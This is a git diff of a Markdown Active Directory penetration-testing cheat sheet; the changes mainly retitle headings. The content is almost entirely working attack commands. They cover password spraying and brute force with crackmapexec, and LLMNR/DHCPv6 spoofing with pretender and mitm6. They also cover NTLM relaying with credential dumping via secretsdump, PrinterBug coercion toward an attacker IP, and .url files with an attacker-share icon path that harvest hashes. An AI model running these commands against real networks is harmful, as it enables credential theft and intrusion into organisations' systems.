@@ -25,6 +25,9 @@ console.log(foo);
 
 
 
+
+
+
 ## Phase 1 - No Creds
 
 ## 1a. Network Recon
@@ -121,7 +124,7 @@ $results = @()
 $results | Where-Object { $_.ports } | Select-Object -Property ip,ports
 ```
 
-#### Sneaky Script to perform a "dirty spray" using DSACLS
+### Powershell - Script to perform a "dirty spray" using DSACLS
 ```powershell
 $fqdn = ((cmd /c set u)[-3] -split "=")[-1]
 $suffix = "local"
@@ -210,25 +213,25 @@ rm cme-ubuntu-latest-3.11.zip
 rm cmedb-ubuntu-latest-3.11.zip  
 ```
 
-#### New Window, Generate Relay List
+#### Crackmapexec -  Generate Relay List
 ```bash
 crackmapexec smb --gen-relay-list relays.txt $cidr
 ```
 
-#### Crackmapexec Brute Force Services LDAP SMB RDP (Warning: can lock stuff out like crazy)
+#### Crackmapexec - Brute Force Services LDAP SMB RDP (Warning: can lock stuff out like crazy)
 ```bash
 crackmapexec ldap $cidr -u $user -p $wordlist
 crackmapexec smb $cidr -u $user -p $wordlist
 crackmapexec rdp $ip -u $user -p $wordlist 
 ```
 
-#### Crackmapexec --no-bruteforce can be useful for MSSQL and WinRM
+#### Crackmapexec-  --no-bruteforce can be useful for MSSQL and WinRM
 ```bash
 crackmapexec mssql $cidr -u $users -p $wordlist --no-bruteforce
 crackmapexec winrm $cidr -u $users -p $wordlist --no-bruteforce
 ```
 
-#### Crackmapexec Spray
+#### Crackmapexec - Password Spray
 ```bash
 crackmapexec ldap $ip -u $users -p $password
 crackmapexec smb $ip -u $users -p $password
@@ -236,39 +239,41 @@ crackmapexec rdp $ip -u $users -p $password
 crackmapexec winrm $ip -u $users -p $password
 ```
 
-#### Spray to check for password re-use
+#### Crackmapexec - Spray to check for password re-use
 ```bash
 crackmapexec ldap $ip -u $users -p $password --coontinue-on-success
 crackmapexec smb $ip -u $users -p $password --coontinue-on-success
 ```
 
-### Pretender
+
+### Pretender - 
 ```bash
 wget https://github.com/RedTeamPentesting/pretender/releases/download/v1.0.0/pretender_1.0.0_Linux_x86_64.tar.gz
 tar -xvf ./pretender_1.0.0_Linux_x86_64.tar.gz
 chmod +x pretender
 ```
 
-#### Start with quiet mode for recon
+#### Pretender -  Start with quiet mode for passive recon
 ```bash
 if="eth0"
 ./pretender -i $if --dry
 ./pretender -i $if --dry --no-ra # without router advertisements
 ```
 
-#### Try local name resolution spoofing via mDNS, LLMNR and NetBIOS-NS as well as a DHCPv6 DNS takeover with router advertisement
+#### Pretender - Try local name resolution spoofing via mDNS, LLMNR and NetBIOS-NS as well as a DHCPv6 DNS takeover with router advertisement
 
-#### You can disable certain attacks with --no-dhcp-dns (disabled DHCPv6, DNS and router advertisements), --no-lnr (disabled mDNS, LLMNR and NetBIOS-NS), --no-mdns, --no-llmnr, --no-netbios and --no-ra
+#### Pretender - You can disable certain attacks with --no-dhcp-dns (disabled DHCPv6, DNS and router advertisements), --no-lnr (disabled mDNS, LLMNR and NetBIOS-NS), --no-mdns, --no-llmnr, --no-netbios and --no-ra
 ```bash
 ./pretender -i $if
 ```
 
-#### If NTLM Relay is running on a different host ( that's IPv6 )
+
+#### Pretender - If NTLM Relay is running on a different host ( that's IPv6 )
 ```bash
 ./pretender -i $if -4 10.0.0.10 -6 fe80::5
 ```
 
-#### Spoof specific domain, Excluding specific hosts from spoofing
+#### Pretender - Spoof specific domain, Excluding specific hosts from spoofing
 ```bash
 ./pretender -i $if --spoof $fqdn --dont-spoof-for $ip,defended-edr2 $fqdn fe80::f --ignore-no$fqdn
 ```
@@ -279,21 +284,21 @@ pip install mitm6
 git clone https://github.com/dirkjanm/mitm6.git
 cd mitm6
 pip install -r ./requirements.txt
-#### Run default
+```
+
+```bash
+# Run default
 mitm6 -i $if -d $fqdn
 ```
 
-#### Run with a relay target and debug information, optionally ignore dhcp6 requests for queries that dont contain $fqdn
+#### MITM6 - Run with a relay target and debug information, optionally ignore dhcp6 requests for queries that dont contain $fqdn
 ```bash
 mitm6 -i $if -r $ip --debug ( --ignore-nofqd )
 ```
 
-
-
-
 ### NTLMRelayX
 
-#### New Window, Start NTLMRelayX w/ IPv6, edit ProxyChains config
+####  NTLMRelayX - Start NTLMRelayX w/ IPv6, edit ProxyChains config
 ```bash
 ./ntlmrelayx.py -6 -socks -smb2support -tf relays.txt
 impacket-ntlmrelayx -6 -socks -smb2support -tf relays.txt
@@ -301,46 +306,47 @@ sudo vim /etc/proxychains4.conf
 socks4 127.0.0.1 1080
 ```
 
-#### Check list of captured sessions in ntlmnrely console
+####  NTLMRelayX - Check list of captured sessions in ntlmnrely console
 ```bash
 socks
 ```
 
-#### SMB Exec over Socks w/ required rights and no AV blocks
+####  NTLMRelayX - SMB Exec over Socks w/ required rights and no AV blocks
 ```bash
 proxychains4 -q smbexec.py $fqdn $user:$password@$ip
 ```
 
-#### Grab Local Admin hash using Secretsdump
+####  NTLMRelayX - Grab Local Admin hash using Secretsdump
 ```bash
 proxychains4 -q secretsdump.py $fqdn $user:$password@$ip
 ```
 
-#### may have to use VSS
+####  NTLMRelayX - may have to use VSS
 ```bash
 proxychains4 -q secretsdump.py -use-vss  $fqdn $user:$password@$ip  
 ```
 
-#### Create Machine Account over LDAPS ( S required)
+####  NTLMRelayX - Create Machine Account over LDAPS ( S required)
 ```bash
 ntlmrelayx.py -t ldaps://domain.srhine.earth --add-computer
 ```
 
-#### Automate Impacket, CME over SOCKS https://github.com/He-No/ntlmrelayx2proxychains
+####  NTLMRelayX - Automate Impacket, CME over SOCKS https://github.com/He-No/ntlmrelayx2proxychains
 ```bash
 python3 ntlmrelay2proxychains.py --action {shares|lsa|sam|...} [--exclude] [--adminonly] [--help]
 ```
 
-#### Execute command / Implant Launcher
+####  NTLMRelayX - Execute command / Implant Launcher
 ```bash
 oneliner=""
 ntlmrelayx.py -6 -tf relays.txt -c $oneliner
 ```
 
+
 ## Phase 1c. Playbooks
 
 #### Initial Relay to PrinterBug
-##### Pretender Recon, see what's saying what to whom 
+##### Pretender Recon - see what's saying what to whom 
 ```bash
 ./pretender -i $if --dry --no-ra # without router advertisements
 ```
@@ -365,7 +371,7 @@ sudo vim /etc/proxychains4.conf
 socks4 127.0.0.1 1080
 ```
 
-##### Printerbug straight and hail mary via socks w/ no password
+##### Impacket - Printerbug straight and hail mary via socks w/ no password
 ```bash
 attacker="192.168.0.243"
 wget https://raw.githubusercontent.com/dirkjanm/krbrelayx/master/printerbug.py
@@ -379,6 +385,7 @@ impacket-ntlmrelayx -t smb://$ip -socks
 proxychains ./printerbug.py -no-pass $fqdn/$user@$ip $attacker
 share="\\192.168.0.243\share"
 ```
+
 
 #### Windows - Start Farmer to collect hashes, Crop to generate new lnks and fertilizer to backdoor exisitng documents on shares
 ```powershell
@@ -395,7 +402,6 @@ WorkingDirectory=wdir
 IconFile=\\192.168.0.243\%USERNAME%.icon
 IconIndex=1
 ```
-
 ##### Make sure 'view file extenxions' is on, create a new text file on share, paste that in, rename the file to .url extension
 
 #### Coerce 2 - RTF that tries to load image
